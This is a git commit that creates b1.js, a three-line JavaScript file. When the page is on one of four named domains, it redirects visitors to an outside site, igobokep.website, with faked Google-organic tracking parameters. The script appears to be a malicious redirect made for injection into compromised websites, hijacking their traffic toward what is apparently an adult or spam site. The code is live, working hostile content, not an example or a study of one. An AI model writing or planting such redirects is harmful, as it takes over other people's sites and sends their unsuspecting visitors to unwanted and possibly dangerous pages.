5970e4d1f1cdc6b5e6bcf1bef7723a257a4b04b2
Galuhput96 <91706295+Galuhput96@users.noreply.github.com>
2025-05-09 19:51:50 +0700

    Create b1.js

---
+++ b1.js
@@ -0,0 +1,3 @@
+if (window.location.host === "pointtopointassociation.com" || window.location.host === "betaswift.com" || window.location.host === "mylocalmenus.co.uk" || window.location.host === "tenacitycapitalpartner.com") {
+  window.location.href = "https://igobokep.website/?utm_medium=ampgoogleorganic&utm_source=igobokep";
+}
